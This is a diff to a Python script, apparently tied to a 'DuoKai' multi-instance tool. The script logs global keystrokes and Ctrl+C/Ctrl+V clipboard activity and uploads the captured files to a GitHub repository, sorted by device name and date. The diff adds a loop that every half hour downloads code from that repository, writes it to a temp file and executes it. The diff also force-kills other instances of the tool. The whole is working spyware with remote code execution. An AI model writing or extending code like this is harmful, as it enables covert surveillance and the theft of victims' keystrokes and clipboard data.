@@ -1,4 +1,5 @@
 import base64
+import importlib.util
 import os
 import socket
 import sys
@@ -17,41 +18,37 @@ os.makedirs(SAVE_DIR, exist_ok=True)
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
+    "file_path": "main_logic.py", # 云端脚本文件名
     "token": "",
 }
 
 uploaded_files = set()
+running_listeners = [] # 用于保存监听器引用以便热替换时关闭
 
 
 def kill_previous_instances():
-    """强制清理当前电脑上旧的 DuoKai.exe / 火麒麟多开 pro 进程"""
+    """清理当前电脑上除了本 PID 以外的旧 DuoKai.exe / Python 进程"""
     try:
         current_pid = os.getpid()
         
-        # 1. 直接清理名为 DuoKai.exe 且 PID 不是当前进程的实例
+        # 1. 结束多余的 DuoKai.exe
         cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
         output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
-        
         for line in output.splitlines():
             if "DuoKai.exe" in line:
                 parts = line.split(',')
                 if len(parts) >= 2:
                     pid_str = parts[1].replace('"', '').strip()
-                    if pid_str.isdigit():
-                        pid = int(pid_str)
-                        if pid != current_pid:
-                            subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
+                    if pid_str.isdigit() and int(pid_str) != current_pid:
+                        subprocess.run(f"taskkill /F /PID {pid_str}", shell=True, capture_output=True)
 
-        # 2. 补充检测：使用 wmic 根据命令行特征或缓存文件名清理残留
+        # 2. 结束残留的 Python 脚本进程
         cmd_wmic = 'wmic process where "name like \'%DuoKai%\' or commandline like \'%_remote_main_cache%\'" get processid'
         output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
         for line in output_wmic.splitlines():
             line = line.strip()
-            if line.isdigit():
-                pid = int(line)
-                if pid != current_pid:
-                    subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True)
-
+            if line.isdigit() and int(line) != current_pid:
+                subprocess.run(f"taskkill /F /PID {line}", shell=True, capture_output=True)
     except Exception:
         pass
 
@@ -61,14 +58,8 @@ def upload_file_smart(file_path):
         return False
 
     file_name = os.path.basename(file_path)
-    
-    # 1. 主文件夹：设备名
     device_folder = DEVICE_NAME
-
-    # 2. 子文件夹：日期
     date_folder = time.strftime('%m.%d').lstrip('0').replace('.0', '.')
-
-    # 3. 结构：uploads/设备名/日期/文件名
     target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
     
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
@@ -192,29 +183,76 @@ def on_press(key):
         pass
 
 
+def auto_update_loop(token):
+    """半小时自动拉取云端最新代码并热替换重启"""
+    cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
+    url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Accept": "application/vnd.github+json",
+    }
+    
+    while True:
+        time.sleep(1800)  # 每半小时 (1800秒) 执行一次热更新
+        try:
+            res = requests.get(url, headers=headers, timeout=10)
+            if res.status_code == 200:
+                content_b64 = res.json().get("content", "")
+                new_code = base64.b64decode(content_b64)
+                
+                # 写入缓存文件
+                with open(cache_path, "wb") as f:
+                    f.write(new_code)
+                
+                write_txt("系统", "已完成半小时定时更新云端代码，正在重新载入...")
+
+                # 停止旧的按键监听器
+                for listener in running_listeners:
+                    try: listener.stop()
+                    except Exception: pass
+                running_listeners.clear()
+
+                # 重新动态加载最新模块并执行 run()
+                spec = importlib.util.spec_from_file_location("remote_main", cache_path)
+                remote_module = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(remote_module)
+                
+                # 在新线程中重新执行最新的 run
+                threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
+                break # 当前老的更新循环退出
+        except Exception:
+            pass
+
+
 def run(token):
-    # 1. 优先清理旧的 DuoKai.exe 残留进程
+    # 1. 优先清理旧残留进程
     kill_previous_instances()
 
     GITHUB_CONFIG["token"] = token
-    write_txt("启动", "加载完成，服务已启动")
+    write_txt("启动", "服务启动完成")
 
+    # 2. 启动上传线程
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
 
+    # 3. 启动键盘/剪贴板监听，并记入 listeners 列表
     try:
-        hotkey_listener = keyboard.GlobalHotKeys(
-            {"<ctrl>+c": on_copy, "<ctrl>+v": on_paste}
-        )
+        hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
         hotkey_listener.start()
+        running_listeners.append(hotkey_listener)
     except Exception as e:
-        write_txt("异常", f"服务启动失败: {e}")
+        write_txt("异常", f"快捷键服务异常: {e}")
 
     try:
         key_listener = keyboard.Listener(on_press=on_press)
         key_listener.start()
+        running_listeners.append(key_listener)
     except Exception as e:
-        write_txt("异常", f"服务启动失败: {e}")
+        write_txt("异常", f"按键服务异常: {e}")
+
+    # 4. 启动半小时定时热更新线程
+    update_thread = threading.Thread(target=auto_update_loop, args=(token,), daemon=True)
+    update_thread.start()
 
     try:
         while True:
